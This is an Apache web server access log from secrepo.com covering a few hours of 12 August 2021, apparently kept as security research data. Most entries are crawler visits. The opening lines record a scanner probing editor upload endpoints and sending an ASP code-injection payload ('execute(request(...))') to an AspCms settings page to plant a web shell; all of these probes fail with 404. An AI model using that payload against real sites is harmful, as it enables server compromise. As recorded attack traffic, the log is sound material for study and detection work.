45.15.11.214 - - [12/Aug/2021:04:34:03 -0700] "GET //admin_aspcms/_system/AspCms_SiteSetting.asp?action=saves\xe2\x80\x9d,%201,%20\xe2\x80\x9crunMode=1&siteMode=1&siteHelp=%B1%BE%CD%F8%D5%BE%D2%F2%B3%CC%D0%F2%C9%FD%BC%B6%B9%D8%B1%D5%D6%D0&SwitchComments=1&SwitchCommentsStatus=1&switchFaq=0:Y=request(chr(35)):execute(Y)&SwitchFaqStatus=0&dirtyStr=&waterMark=1&waterMarkFont=hahahaha&waterMarkLocation=1&smtp_usermail=aspcmstest%40163.com&smtp_user=aspcmstest&smtp_password=aspcms.cn&smtp_server=smtp.163.com&MessageAlertsEmail=13322712%40qq.com&messageReminded=1&orderReminded=1&applyReminded=1&commentReminded=1&LanguageID=1 HTTP/1.1" 404 305 "http://www.secrepo.com//admin_aspcms/_system/AspCms_SiteSetting.asp?action=saves\xa1\xb1, 1, \xa1\xb0runMode=1&siteMode=1&siteHelp=%B1%BE%CD%F8%D5%BE%D2%F2%B3%CC%D0%F2%C9%FD%BC%B6%B9%D8%B1%D5%D6%D0&SwitchComments=1&SwitchCommentsStatus=1&switchFaq=0:Y=request(chr(35)):execute(Y)&SwitchFaqStatus=0&dirtyStr=&waterMark=1&waterMarkFont=hahahaha&waterMarkLocation=1&smtp_usermail=aspcmstest%40163.com&smtp_user=aspcmstest&smtp_password=aspcms.cn&smtp_server=smtp.163.com&MessageAlertsEmail=13322712%40qq.com&messageReminded=1&orderReminded=1&applyReminded=1&commentReminded=1&LanguageID=1" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
45.15.11.214 - - [12/Aug/2021:04:34:03 -0700] "POST //fckeditor/editor/filemanager/upload/php/upload.php?Type=Media HTTP/1.1" 404 269 "http://www.secrepo.com//fckeditor/editor/filemanager/upload/php/upload.php?Type=Media" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0" 
45.15.11.214 - - [12/Aug/2021:04:34:04 -0700] "GET //function/editor/php/upload_json.php?upload_file=aaa HTTP/1.1" 404 328 "http://www.secrepo.com//function/editor/php/upload_json.php?upload_file=aaa" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
45.15.11.214 - - [12/Aug/2021:04:34:04 -0700] "GET //client/manage/ourphp_filebox.php?op=home&folder=./&validation=&code= HTTP/1.1" 404 305 "http://www.secrepo.com//client/manage/ourphp_filebox.php?op=home&folder=./&validation=&code=" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
114.119.154.13 - - [12/Aug/2021:04:35:12 -0700] "GET /self.logs/2015/error.log.2015-08-09.gz HTTP/1.1" 200 901 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
118.184.177.110 - - [12/Aug/2021:04:35:16 -0700] "GET / HTTP/1.1" 200 12845 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
52.183.18.135 - - [12/Aug/2021:04:37:19 -0700] "GET / HTTP/1.1" 200 12838 "-" "awesome_bot" 
49.7.20.108 - - [12/Aug/2021:04:43:00 -0700] "GET / HTTP/1.1" 200 12845 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
58.250.125.151 - - [12/Aug/2021:04:45:08 -0700] "GET / HTTP/1.1" 200 12844 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
114.119.154.11 - - [12/Aug/2021:04:48:43 -0700] "GET /self.logs/access.log.2019-07-27.gz HTTP/1.1" 200 24359 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
114.119.154.13 - - [12/Aug/2021:04:55:30 -0700] "GET /self.logs/access.log.2018-11-08.gz HTTP/1.1" 200 26462 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
106.38.241.177 - - [12/Aug/2021:05:03:39 -0700] "GET / HTTP/1.1" 200 12845 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
49.7.21.94 - - [12/Aug/2021:05:06:23 -0700] "GET / HTTP/1.1" 200 12845 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
106.38.241.178 - - [12/Aug/2021:05:08:16 -0700] "GET / HTTP/1.1" 301 438 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
106.38.241.144 - - [12/Aug/2021:05:08:23 -0700] "GET / HTTP/1.1" 200 12845 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
114.119.154.14 - - [12/Aug/2021:05:09:11 -0700] "GET /self.logs/access.log.2017-03-05.gz HTTP/1.1" 200 14725 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
106.38.241.144 - - [12/Aug/2021:05:10:30 -0700] "GET / HTTP/1.1" 200 12845 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
111.198.224.23 - - [12/Aug/2021:05:11:29 -0700] "GET / HTTP/1.1" 200 12882 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko)" 
111.198.224.23 - - [12/Aug/2021:05:11:30 -0700] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 328 "-" "Safari%E6%B5%8F%E8%A7%88%E5%99%A8/16611.3.10.1.3 CFNetwork/1240.0.4 Darwin/20.6.0" 
111.198.224.23 - - [12/Aug/2021:05:11:30 -0700] "GET /apple-touch-icon.png HTTP/1.1" 404 305 "-" "Safari%E6%B5%8F%E8%A7%88%E5%99%A8/16611.3.10.1.3 CFNetwork/1240.0.4 Darwin/20.6.0" 
111.198.224.23 - - [12/Aug/2021:05:11:30 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 690 "-" "Safari%E6%B5%8F%E8%A7%88%E5%99%A8/16611.3.10.1.3 CFNetwork/1240.0.4 Darwin/20.6.0" 
111.198.224.23 - - [12/Aug/2021:05:11:30 -0700] "GET / HTTP/1.1" 200 12882 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1" 
111.198.224.23 - - [12/Aug/2021:05:11:31 -0700] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 305 "-" "Safari%E6%B5%8F%E8%A7%88%E5%99%A8/16611.3.10.1.3 CFNetwork/1240.0.4 Darwin/20.6.0" 
111.198.224.23 - - [12/Aug/2021:05:11:31 -0700] "GET /apple-touch-icon.png HTTP/1.1" 404 305 "-" "Safari%E6%B5%8F%E8%A7%88%E5%99%A8/16611.3.10.1.3 CFNetwork/1240.0.4 Darwin/20.6.0" 
106.38.241.144 - - [12/Aug/2021:05:12:01 -0700] "GET / HTTP/1.1" 200 12845 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
106.38.241.144 - - [12/Aug/2021:05:13:18 -0700] "GET / HTTP/1.1" 200 12845 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
106.38.241.144 - - [12/Aug/2021:05:15:11 -0700] "GET / HTTP/1.1" 200 12844 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
114.119.154.13 - - [12/Aug/2021:05:16:01 -0700] "GET /self.logs/2015/error.log.2015-11-11.gz HTTP/1.1" 200 681 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
106.38.241.144 - - [12/Aug/2021:05:17:16 -0700] "GET / HTTP/1.1" 200 12844 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
106.38.241.144 - - [12/Aug/2021:05:20:23 -0700] "GET / HTTP/1.1" 200 12844 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
114.119.154.13 - - [12/Aug/2021:05:22:53 -0700] "GET /self.logs/access.log.2019-08-30.gz HTTP/1.1" 200 16259 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
36.110.199.17 - - [12/Aug/2021:05:24:43 -0700] "GET / HTTP/1.1" 200 12881 "http://www.baidu.com/s?wd=riseij2" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0" 
36.110.199.17 - - [12/Aug/2021:05:24:43 -0700] "GET /css/style.css HTTP/1.1" 404 305 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0" 
106.38.241.144 - - [12/Aug/2021:05:25:38 -0700] "GET / HTTP/1.1" 200 12844 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
114.119.154.14 - - [12/Aug/2021:05:29:48 -0700] "GET /self.logs/error.log.2019-02-06.gz HTTP/1.1" 200 6028 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
49.7.20.105 - - [12/Aug/2021:05:33:04 -0700] "GET / HTTP/1.1" 200 12845 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
106.38.241.177 - - [12/Aug/2021:05:36:31 -0700] "GET / HTTP/1.1" 200 12845 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
106.38.241.144 - - [12/Aug/2021:05:36:43 -0700] "GET / HTTP/1.1" 200 12845 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
49.7.20.108 - - [12/Aug/2021:05:37:25 -0700] "GET / HTTP/1.1" 200 12845 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
106.38.241.178 - - [12/Aug/2021:05:41:35 -0700] "GET / HTTP/1.1" 200 12845 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
40.77.167.11 - - [12/Aug/2021:05:54:07 -0700] "GET /Datasets%20Description/HTML_Bro_log_3?C=D;O=A HTTP/1.1" 301 635 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
106.38.241.144 - - [12/Aug/2021:05:55:28 -0700] "GET / HTTP/1.1" 200 12845 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
111.68.102.20 - - [12/Aug/2021:06:00:07 -0700] "GET / HTTP/1.1" 200 12882 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36" 
111.68.102.20 - - [12/Aug/2021:06:00:07 -0700] "GET /css/style.css HTTP/1.1" 404 305 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36" 
111.68.102.20 - - [12/Aug/2021:06:00:07 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27916 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36" 
111.68.102.20 - - [12/Aug/2021:06:00:07 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7533 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36" 
111.68.102.20 - - [12/Aug/2021:06:00:10 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 713 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36" 
114.119.154.115 - - [12/Aug/2021:06:03:50 -0700] "GET /self.logs/error.log.2019-07-02.gz HTTP/1.1" 200 2279 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
106.38.241.177 - - [12/Aug/2021:06:09:48 -0700] "GET / HTTP/1.1" 200 12845 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
114.119.154.161 - - [12/Aug/2021:06:10:39 -0700] "GET /self.logs/error.log.2017-07-01.gz HTTP/1.1" 200 908 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
120.244.142.146 - - [12/Aug/2021:06:11:11 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.0" 200 676 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36" 
106.38.241.144 - - [12/Aug/2021:06:16:25 -0700] "GET / HTTP/1.1" 200 12844 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
34.235.155.55 - - [12/Aug/2021:06:21:03 -0700] "GET / HTTP/1.1" 200 12881 "-" "Iframely/1.3.1 (+https://iframely.com/docs/about)" 
49.7.21.94 - - [12/Aug/2021:06:21:45 -0700] "GET / HTTP/1.1" 200 12844 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
114.119.141.53 - - [12/Aug/2021:06:24:21 -0700] "GET /self.logs/error.log.2017-01-25.gz HTTP/1.1" 200 1421 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
93.188.2.5 - - [12/Aug/2021:06:28:20 -0700] "GET /old/ HTTP/1.1" 301 427 "-" "-" 
93.188.2.5 - - [12/Aug/2021:06:28:21 -0700] "GET /old/ HTTP/1.1" 404 284 "-" "-" 
80.74.149.192 - - [12/Aug/2021:06:30:56 -0700] "GET /wp/ HTTP/1.1" 301 425 "-" "-" 
49.7.20.108 - - [12/Aug/2021:06:30:56 -0700] "GET / HTTP/1.1" 200 12845 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
80.74.149.192 - - [12/Aug/2021:06:30:56 -0700] "GET /wp/ HTTP/1.1" 404 284 "-" "-" 
114.119.154.155 - - [12/Aug/2021:06:31:02 -0700] "GET /self.logs/error.log.2020-02-28 HTTP/1.1" 200 351 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
106.38.241.178 - - [12/Aug/2021:06:32:37 -0700] "GET / HTTP/1.1" 200 12845 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
203.159.80.102 - - [12/Aug/2021:06:36:12 -0700] "GET /wp-admin/css/ HTTP/1.1" 404 328 "binance.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36" 
203.159.80.102 - - [12/Aug/2021:06:36:14 -0700] "GET /.well-known/ HTTP/1.1" 200 664 "binance.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36" 
203.159.80.102 - - [12/Aug/2021:06:36:17 -0700] "GET /sites/default/files/ HTTP/1.1" 404 328 "binance.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36" 
203.159.80.102 - - [12/Aug/2021:06:36:18 -0700] "GET /admin/controller/extension/extension/ HTTP/1.1" 404 328 "binance.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36" 
203.159.80.102 - - [12/Aug/2021:06:36:20 -0700] "GET /uploads/ HTTP/1.1" 404 328 "binance.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36" 
203.159.80.102 - - [12/Aug/2021:06:36:22 -0700] "GET /images/ HTTP/1.1" 404 328 "binance.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36" 
203.159.80.102 - - [12/Aug/2021:06:36:23 -0700] "GET /files/ HTTP/1.1" 404 328 "binance.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36" 
114.119.130.95 - - [12/Aug/2021:06:37:54 -0700] "GET /self.logs/access.log.2017-05-31.gz HTTP/1.1" 200 18752 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
106.38.241.144 - - [12/Aug/2021:06:38:21 -0700] "GET / HTTP/1.1" 200 12845 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
106.38.241.177 - - [12/Aug/2021:06:40:24 -0700] "GET / HTTP/1.1" 200 12845 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
114.119.154.14 - - [12/Aug/2021:06:44:43 -0700] "GET /self.logs/error.log.2019-05-12.gz HTTP/1.1" 200 4319 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
66.249.64.92 - - [12/Aug/2021:06:53:57 -0700] "GET /robots.txt HTTP/1.1" 301 495 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
66.249.64.143 - - [12/Aug/2021:06:53:57 -0700] "GET /robots.txt HTTP/1.1" 200 377 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
66.249.64.92 - - [12/Aug/2021:06:53:57 -0700] "GET / HTTP/1.1" 301 474 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
66.249.64.143 - - [12/Aug/2021:06:53:58 -0700] "GET / HTTP/1.1" 200 12882 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
66.249.64.149 - - [12/Aug/2021:06:54:00 -0700] "GET /css/style.css HTTP/1.1" 404 328 "http://www.secrepo.com/" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/92.0.4515.119 Safari/537.36" 
66.249.64.136 - - [12/Aug/2021:06:54:01 -0700] "GET /css/style.css HTTP/1.1" 404 328 "http://www.secrepo.com/" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/92.0.4515.119 Safari/537.36" 
114.119.154.155 - - [12/Aug/2021:06:57:54 -0700] "GET /self.logs/access.log.2018-12-21.gz HTTP/1.1" 200 21384 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
118.184.177.110 - - [12/Aug/2021:06:59:02 -0700] "GET / HTTP/1.1" 200 12845 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
106.38.241.144 - - [12/Aug/2021:06:59:54 -0700] "GET / HTTP/1.1" 200 12845 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
95.163.255.52 - - [12/Aug/2021:07:06:41 -0700] "GET /robots.txt HTTP/1.0" 200 340 "-" "Mozilla/5.0 (compatible; Linux x86_64; Mail.RU_Bot/2.0; +http://go.mail.ru/help/robots)" 
95.163.255.56 - - [12/Aug/2021:07:06:42 -0700] "GET /Datasets%20Description/ HTTP/1.1" 200 640 "-" "Mozilla/5.0 (compatible; Linux x86_64; Mail.RU_Bot/2.0; +http://go.mail.ru/help/robots)" 
58.96.14.53 - - [12/Aug/2021:07:10:57 -0700] "GET / HTTP/1.1" 200 12882 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15" 
114.119.154.113 - - [12/Aug/2021:07:11:30 -0700] "GET /self.logs/access.log.2018-08-22.gz HTTP/1.1" 200 24992 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
106.38.241.177 - - [12/Aug/2021:07:12:05 -0700] "GET / HTTP/1.1" 200 12845 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
106.38.241.178 - - [12/Aug/2021:07:20:33 -0700] "GET / HTTP/1.1" 200 12844 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
106.38.241.144 - - [12/Aug/2021:07:21:05 -0700] "GET / HTTP/1.1" 200 12844 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
49.7.20.108 - - [12/Aug/2021:07:21:52 -0700] "GET / HTTP/1.1" 200 12844 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
114.119.154.113 - - [12/Aug/2021:07:25:22 -0700] "GET /self.logs/access.log.2020-07-19.gz HTTP/1.1" 200 24902 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
40.77.167.9 - - [12/Aug/2021:07:29:46 -0700] "GET /self.logs/access.log.2017-11-20.gz HTTP/1.1" 200 27376 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
114.119.154.13 - - [12/Aug/2021:07:32:11 -0700] "GET /self.logs/access.log.2020-10-23.gz HTTP/1.1" 200 13264 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
49.7.21.94 - - [12/Aug/2021:07:34:41 -0700] "GET / HTTP/1.1" 200 12845 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
106.38.241.144 - - [12/Aug/2021:07:35:32 -0700] "GET / HTTP/1.1" 301 438 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
114.119.154.124 - - [12/Aug/2021:07:39:04 -0700] "GET /self.logs/access.log.2017-10-20.gz HTTP/1.1" 200 23708 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
106.38.241.144 - - [12/Aug/2021:07:39:51 -0700] "GET / HTTP/1.1" 301 438 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
107.77.111.94 - - [12/Aug/2021:07:39:51 -0700] "GET / HTTP/1.1" 200 12882 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36" 
107.77.111.94 - - [12/Aug/2021:07:39:51 -0700] "GET /css/style.css HTTP/1.1" 404 328 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36" 
107.77.111.94 - - [12/Aug/2021:07:39:51 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27893 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36" 
107.77.111.94 - - [12/Aug/2021:07:39:51 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7556 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36" 
106.38.241.177 - - [12/Aug/2021:07:42:21 -0700] "GET / HTTP/1.1" 200 12845 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
106.38.241.144 - - [12/Aug/2021:07:42:53 -0700] "GET / HTTP/1.1" 301 438 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
106.38.241.160 - - [12/Aug/2021:07:43:15 -0700] "GET / HTTP/1.1" 200 12845 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
106.38.241.160 - - [12/Aug/2021:07:44:21 -0700] "GET / HTTP/1.1" 200 12845 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
106.38.241.160 - - [12/Aug/2021:07:45:31 -0700] "GET / HTTP/1.1" 200 12845 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
114.119.154.161 - - [12/Aug/2021:07:46:03 -0700] "GET /self.logs/access.log.2019-03-21.gz HTTP/1.1" 200 32598 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
106.38.241.144 - - [12/Aug/2021:07:46:18 -0700] "GET / HTTP/1.1" 200 12845 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
106.38.241.160 - - [12/Aug/2021:07:46:47 -0700] "GET / HTTP/1.1" 200 12845 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
106.38.241.160 - - [12/Aug/2021:07:48:19 -0700] "GET / HTTP/1.1" 200 12845 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
106.38.241.160 - - [12/Aug/2021:07:50:23 -0700] "GET / HTTP/1.1" 200 12845 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
114.119.154.115 - - [12/Aug/2021:08:06:31 -0700] "GET /self.logs/error.log.2020-06-25 HTTP/1.1" 200 351 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
106.38.241.144 - - [12/Aug/2021:08:07:24 -0700] "GET / HTTP/1.1" 200 12845 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
106.38.241.178 - - [12/Aug/2021:08:08:46 -0700] "GET / HTTP/1.1" 200 12845 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
52.37.202.144 - - [12/Aug/2021:08:09:06 -0700] "GET / HTTP/1.1" 301 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36" 
34.219.160.61 - - [12/Aug/2021:08:09:16 -0700] "GET / HTTP/1.1" 301 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36" 
34.219.160.61 - - [12/Aug/2021:08:09:21 -0700] "GET / HTTP/1.1" 200 12838 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36" 
20.191.45.212 - - [12/Aug/2021:08:09:36 -0700] "GET / HTTP/1.1" 200 12882 "http://www.secrepo.com/" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)" 
20.191.45.212 - - [12/Aug/2021:08:09:37 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 690 "http://www.secrepo.com/bootstrap/img/favicon.ico" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)" 
